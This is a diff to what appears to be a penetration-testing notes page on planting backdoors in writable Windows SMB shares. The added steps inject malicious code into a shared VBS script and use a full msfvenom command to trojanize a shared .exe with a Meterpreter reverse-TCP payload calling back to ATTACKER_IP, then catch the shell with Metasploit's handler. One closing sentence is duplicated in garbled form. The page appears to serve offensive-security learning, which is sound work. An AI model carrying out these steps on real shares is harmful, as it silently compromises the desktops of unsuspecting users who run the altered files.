@@ -28,7 +28,11 @@ If the share is writable by anyone (or at least our compromised account), we can
 
 Given that we have found a VBS (`.vbs` ) script running hosted on the share, we can inject a malicious code into script to provide ourselves with a backdoor.
 
+**Step 1**
+
 First, we have to upload a binary (such as `nc64.exe` ) that will aid us in creating the backdoor. This can be achieved using [smbclient](https://jarrettgxz-sec.gitbook.io/networking-concepts/networking-tools/miscellaneous/smbclient).
+
+**Step 2**
 
 Next, we can inject the malicious in the existing script. Assuming that the writable share is at `\\TARGET_IP\writable_share` .
 
@@ -58,13 +62,25 @@ value of `0` : "Hides the window and activates another window."
 
 If set to `True` , script execution halts until the program finishes.
 
+**Step 3**
 
-
-Now, whenever someone executes this script, we will gain a remote shell on that user's desktop.
+Finally, we have to start a listener using the `exploit/multi/handler` from Metasploit. Now, we will gain a remote shell on a user's desktop whenever someone executes this script.
 
 ### (2) Backdoor via `.exe` files
 
+Given that we have found a Windows binary such as an `.exe` file, we can download it from the share and use `msfvenom` to inject a backdoor functionality. The result is a binary that still fulfils its original purpose, but execute an additional payload silently.
 
+**Step 1**
 
+We can use the downloaded binary as a template to create a new malicious binary (suppose the binary is named `vuln.exe`):
 
+{% code overflow="wrap" %}
+```sh
+$ msfvenom --platform windows -x vuln.exe -k -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b "\x00" -f exe -o mal_vuln.exe
+```
+{% endcode %}
+
+**Step 2**
+
+Finally, we have to start a listener using the `exploit/multi/handler` from Metasploit. Now, whenever someone executes this script, we will gain a remote shell on that user's desktop. Now, we will gain a remote shell on a user's desktop whenever someone executes the binary.
 
